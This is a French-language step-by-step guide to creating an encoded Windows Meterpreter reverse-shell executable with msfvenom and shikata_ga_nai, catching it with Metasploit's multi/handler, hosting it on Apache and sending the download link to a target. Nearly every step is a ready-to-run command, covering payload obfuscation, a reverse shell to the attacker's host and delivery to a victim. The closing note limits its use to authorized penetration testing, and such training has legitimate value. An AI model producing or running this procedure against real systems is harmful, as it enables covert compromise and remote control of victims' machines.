### Étape 1 : **Afficher les exploits disponibles dans Metasploit**
1. **Lancer Metasploit** :
   ```bash
   msfconsole
   ```

2. **Afficher la liste des exploits disponibles** :
   ```bash
   show exploits
   ```
   - Parcourez la liste et choisissez l'exploit souhaité. Pour un simple handler pour reverse shell, on utilise `exploit/multi/handler`.

### Étape 2 : **Créer le payload encodé avec `shikata_ga_nai`**
1. **Afficher les payloads disponibles avec `msfvenom`** :
   ```bash
   msfvenom --list payloads
   ```
   - Choisissez le payload approprié, par exemple `windows/meterpreter/reverse_tcp`.

2. **Créer le payload avec encodage** :
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<votre_IP> LPORT=<votre_port> -e x86/shikata_ga_nai -i 5 -f exe > payload_encoded.exe
   ```
   - **Explication des options** :
     - `-p windows/meterpreter/reverse_tcp` : Payload pour un reverse shell Meterpreter.
     - `LHOST` : Adresse IP de votre machine attaquante.
     - `LPORT` : Port d'écoute sur votre machine.
     - `-e x86/shikata_ga_nai` : Utilisation de l'encodeur `shikata_ga_nai`.
     - `-i 5` : Nombre d'itérations d'encodage pour augmenter l'obfuscation.
     - `-f exe` : Format du fichier de sortie.

### Étape 3 : **Configurer le listener dans Metasploit**
1. **Sélectionner l'exploit `multi/handler`** :
   ```bash
   use exploit/multi/handler
   ```

2. **Afficher les options disponibles pour l'exploit** :
   ```bash
   show options
   ```

3. **Configurer les options du payload** :
   ```bash
   set payload windows/meterpreter/reverse_tcp
   set LHOST <votre_IP>
   set LPORT <votre_port>
   show options
   ```
   - Vérifiez que toutes les options sont correctement configurées.

4. **Lancer l'exploit** :
   ```bash
   exploit
   ```

### Étape 4 : **Partager le payload via un serveur web**
1. **Copier le payload dans le répertoire du serveur web** :
   ```bash
   cp payload_encoded.exe /var/www/html/
   ```

2. **Vérifier le statut du serveur Apache** :
   ```bash
   service apache2 status
   ```
   - Si le serveur n'est pas démarré, utilisez :
     ```bash
     service apache2 start
     ```

3. **Vérifier l'accès au payload** :
   Accédez au lien suivant depuis un navigateur ou utilisez `curl` :
   ```bash
   curl http://<votre_IP>/payload_encoded.exe
   ```

### Étape 5 : **Partager le lien de téléchargement**
Envoyez le lien à la cible pour télécharger le payload :
```text
http://<votre_IP>/payload_encoded.exe
```

### Étape 6 : **Attendre l'exécution et capturer la session Meterpreter**
Une fois que le payload est exécuté sur la machine cible, la session `meterpreter` sera automatiquement ouverte dans Metasploit, permettant l'interaction avec la cible.

### **Note Importante** :
Cette procédure est réservée aux tests de pénétration éthiques et autorisés sur des systèmes pour lesquels vous avez obtenu la permission. Toute utilisation non autorisée est illégale et contraire à l'éthique.
